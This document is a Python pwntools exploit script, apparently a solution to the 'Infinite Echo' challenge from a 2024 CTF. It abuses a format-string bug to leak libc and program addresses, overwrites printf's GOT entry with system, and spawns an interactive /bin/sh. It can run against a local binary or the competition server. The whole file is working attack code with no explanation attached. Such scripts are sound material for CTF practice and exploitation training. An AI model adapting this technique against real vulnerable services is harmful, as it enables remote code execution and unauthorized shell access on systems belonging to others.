#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/Lexington Informatics Tournament CTF 2024/pwn/Infinite Echo/main')
elf = ELF(TARGET)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    r.sendlineafter(b'Echo!\n', b'%41$p\n%45$p')

    main_ret = int(r.recvline().strip(), 16)
    main = int(r.recvline().strip(), 16)
    libc.address = main_ret - libc.libc_start_main_return
    elf.address = main - elf.sym.main

    log.info(f'libc.address: {hex(libc.address)}')
    log.info(f'elf.address: {hex(elf.address)}')

    payload = fmtstr_payload(6, {elf.got.printf: libc.sym.system})

    r.sendline(payload)
    sleep(1)
    r.sendline(b'/bin/sh')
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('litctf.org', 31772)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
